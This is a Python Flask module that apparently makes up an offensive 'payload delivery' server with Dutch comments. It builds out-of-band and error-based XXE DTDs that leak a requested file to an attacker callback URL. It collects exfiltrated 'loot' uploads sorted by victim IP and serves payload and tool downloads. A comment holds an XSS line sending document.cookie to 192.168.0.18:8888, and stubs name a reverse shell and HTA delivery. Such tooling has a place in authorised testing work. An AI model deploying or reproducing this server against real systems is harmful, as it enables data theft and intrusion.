from meuk.hacksec import *
from flask import Blueprint, render_template, redirect, url_for, flash, send_from_directory, abort, request, Response
import glob

# Blueprint Configuration
main_bp = Blueprint('main_bp', __name__,
                    template_folder='meuk/templates',
                    static_folder='meuk/static')


#basic website
@main_bp.route('/', defaults={'cms_pag': 'index'}, methods=['GET', 'POST'])
@main_bp.route('/<cms_pag>')
def index(cms_pag):

    ip = request.remote_addr
    if ip != '127.0.0.1':

        #setup our payload delivery

        #is payload accepted
        

        return 'ik ben een ander'

    else:
        #use our normal pages
        return 'hallo wereld'

#favicon



#Alle downloads weergeven
@main_bp.route("/downloads", methods=["GET"])
@main_bp.route("/downloads/", methods=["GET"])
def downloads_weergeven():
    a=1
    return ''
#shell_443.txt


##set local ip

##serve HTA 

#SVG


##XSScookie

#var i=new Image;
#i.src="http://192.168.0.18:8888/?"+document.cookie;

#

##xxee
@main_bp.route("/yolo.dtd", methods=["GET"])
def oob():
    global callback
    if request.args.get('resource'):
        if request.args.get('callback'):
            callback = request.args.get('callback')

        xml = '<!ENTITY % ext SYSTEM "' + request.args.get('resource') + '"><!ENTITY % eval "<!ENTITY &#x25; yolo SYSTEM \'' + callback + '/?hatseflats=%ext;\'>">%eval;%oob;'
        return Response(xml, mimetype='text/xml')
    else:
        abort(404, description="[*] Incompetent Bastard v0.42\n[!] You failed!")

#xxe callback




@main_bp.route("/fout.dtd", methods=["GET"])
def error():
    if request.args.get('resource'):
        xml = '<!ENTITY % ext SYSTEM "' + request.args.get('resource') + '"><!ENTITY % eval "<!ENTITY &#x25; error SYSTEM \'file:///nonexistent/%ext;\'>">%eval;%error;'
        return Response(xml, mimetype='text/xml')
    else:
        abort(404, description="[*] Incompetent Bastard v0.42\n[!] You failed!")

#handle uploads writes to raw loot, fetches the ip creates a folder and saves the file
@main_bp.route("/upload", methods=["POST"])
@main_bp.route("/upload/", methods=["POST"])
def meukuploads():
    ip = request.remote_addr
    try:
        if not os.path.exists(os.path.join('raw', 'loot', ip)):
            os.makedirs(f"raw/loot/{ip}")
        file = request.files['file']
        file.save(os.path.join('raw', 'loot', ip, file.filename))
        return "[*] Incompetent Bastard v0.42\n[+] Tot ziens en bedankt voor de vis..."
    except:
        return  "[*] Incompetent Bastard v0.42\n[!] You failed! Try with curl -F file=@FILENAME http://127.0.0.1/upload"


@main_bp.route("/uploadform", methods=["GET","POST"])
def meukupload():
    return 'ik ben het formulier'


#downloads
@main_bp.route("/p/<bestand>", methods=["GET"])
@main_bp.route("/payloads/<bestand>", methods=["GET"])
def payload_download(bestand):
    if os.path.isfile(os.path.join('http','payloads', bestand)):
        return send_from_directory('http/payloads/', bestand, as_attachment=True)
    else:
        abort(404, description="[*] Incompetent Bastard v0.42\n[!] You failed!")
#downloads
@main_bp.route("/t/<bestand>", methods=["GET"])
@main_bp.route("/tools/<bestand>", methods=["GET"])
def tools_download(bestand):
    if os.path.isfile(os.path.join('http','tools', bestand)):
        return send_from_directory('http/tools/', bestand, as_attachment=True)
    else:
        abort(404, description="[*] Incompetent Bastard v0.42\n[!] You failed!")
        
@main_bp.route("/tm/<bestand>", methods=["GET"])
@main_bp.route("/tools/mini/<bestand>", methods=["GET"])
def mimi_download(bestand):
    if os.path.isfile(os.path.join('http','tools','mini', bestand)):
        return send_from_directory('http/tools/mini/', bestand, as_attachment=True)
    else:
        abort(404, description="[*] Incompetent Bastard v0.42\n[!] You failed!")


#second order sqli


